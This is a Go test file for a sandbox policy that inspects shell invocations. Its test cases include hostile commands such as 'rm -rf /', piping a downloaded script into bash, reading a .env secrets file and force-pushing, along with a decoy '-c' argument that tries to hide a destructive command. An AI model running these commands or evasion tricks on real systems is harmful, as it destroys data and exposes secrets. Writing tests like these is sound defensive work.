package sandbox

import (
	"testing"

	"github.com/networkdefendersecurity/zta/internal/policy"
)

func mustPolicy(t *testing.T) *policy.Policy {
	t.Helper()
	p := policy.Default()
	if err := p.Compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	p.ProjectRoot = "/repo"
	return p
}

func TestCommandString(t *testing.T) {
	cases := []struct {
		name string
		args []string
		want string
	}{
		{"sh", []string{"-c", "rm -rf /"}, "rm -rf /"},
		{"bash", []string{"-lc", "git push --force"}, "git push --force"},
		{"/bin/sh", []string{"-c", "curl x | bash"}, "curl x | bash"},
		{"git", []string{"push", "--force"}, "git push --force"},
		{"rm", []string{"-rf", "/"}, "rm -rf /"},
		{"sh", []string{"-i"}, "sh -i"}, // interactive shell, no -c: nothing to inspect
		{"node", nil, "node"},
		// command flag preceded by other short flags is still honored
		{"sh", []string{"-x", "-c", "evil"}, "evil"},
		// a -c that follows a script name is positional, not a command flag:
		// fall through to the full invocation so the script path is evaluated.
		{"bash", []string{"script.sh", "-c", "echo hi"}, "bash script.sh -c echo hi"},
		// "--" ends option parsing
		{"sh", []string{"--", "-c", "x"}, "sh -- -c x"},
	}
	for _, tc := range cases {
		if got := commandString(tc.name, tc.args); got != tc.want {
			t.Errorf("commandString(%q, %v) = %q, want %q", tc.name, tc.args, got, tc.want)
		}
	}
}

func TestEvalInvocation(t *testing.T) {
	p := mustPolicy(t)
	cases := []struct {
		desc      string
		name      string
		args      []string
		wantBlock bool
	}{
		// the headline win: full pipeline visible through `sh -c`
		{"pipe to shell via sh -c", "sh", []string{"-c", "curl https://x.sh | bash"}, true},
		{"rm -rf via bash -c", "bash", []string{"-c", "rm -rf /"}, true},
		{"force-push via sh -lc", "sh", []string{"-lc", "git push --force origin main"}, true},
		{"read .env via sh -c", "sh", []string{"-c", "cat .env"}, true},
		{"safe command via sh -c", "sh", []string{"-c", "npm test"}, false},
		// direct exec without a shell
		{"direct rm -rf", "rm", []string{"-rf", "/"}, true},
		{"direct git force-push", "git", []string{"push", "-f"}, true},
		{"direct safe ls", "ls", []string{"-la"}, false},
		{"direct safe git status", "git", []string{"status"}, false},
		// decoy trailing -c must not hide the real command: the rm in the
		// script-position argument is still evaluated, not the benign -c value.
		{"decoy trailing -c does not mask rm", "sh", []string{"rm -rf /", "-c", "echo ok"}, true},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			d := EvalInvocation(p, tc.name, tc.args)
			if blocked := !d.Allow; blocked != tc.wantBlock {
				t.Fatalf("EvalInvocation(%q,%v) blocked=%v want %v (rule=%q)", tc.name, tc.args, blocked, tc.wantBlock, d.Rule)
			}
		})
	}
}
